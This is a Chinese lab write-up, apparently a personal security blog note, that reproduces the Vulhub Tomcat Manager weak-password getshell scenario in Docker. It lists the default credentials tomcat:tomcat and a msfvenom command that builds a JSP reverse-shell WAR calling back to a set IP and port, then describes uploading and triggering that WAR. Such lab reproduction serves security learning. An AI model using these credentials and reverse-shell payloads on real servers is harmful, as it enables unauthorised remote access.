ailx10说：这篇是我2024年10月写的。这份 Tomcat Manager 记录保留的是那次很直观的部署实验：先配置弱账号和远程入口，再登录后台传 WAR，最后访问应用里的执行入口。看见连接出现很容易觉得“一个上传就结束了”，但前面已经人为开放了管理权限。我的笔记也把默认没有这些用户、访问受限制的情况写了进去，所以回看时别把管理功能本身当成无条件漏洞。它和另一处重复收录讲的是同一段经历，真正要记的是权限配置怎样改变了风险。

---

本文记录历史环境中以管理账号登录并部署应用的过程。

该条与 A0274 重复收录；管理功能和访问限制取决于配置，默认无账号的历史环境描述不应推广为当前版本结论。

前提：准备好docker环境，下载好vulhub，进入目录 ，开始复现漏洞

- `docker-compose build//可选`
- `docker-compose up -d`

完成试验后，记得删除漏洞环境哦～～

- `docker-compose down`

简单访问一下，说明 Tomcat7\+ 弱口令 \&\& 后台getshell漏洞 环境搭建成功了

![](/notes-assets/9bc15d57f4af637529f9.webp)

（1）访问Manager App，输入用户名密码（`tomcat:tomcat`）

```
http://144.34.162.13:8080/manager/html
```

![](/notes-assets/7a7aa4c658e6903cfa56.webp)

![](/notes-assets/69bd28f2033883368e5d.webp)

（2）生成反弹shell的war包

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=144.34.162.13 LPORT=6666 -f war > shell.war
```

![](/notes-assets/90e2d9cd4e70e2f828a3.webp)

（3）上传`shell.war`包后，多了一个`shell` ，点击它，就能反弹shell

![](/notes-assets/4c71a8d3382f972542b2.webp)

（4）反弹shell成功

![](/notes-assets/d3e3e8420d9e7824e589.webp)
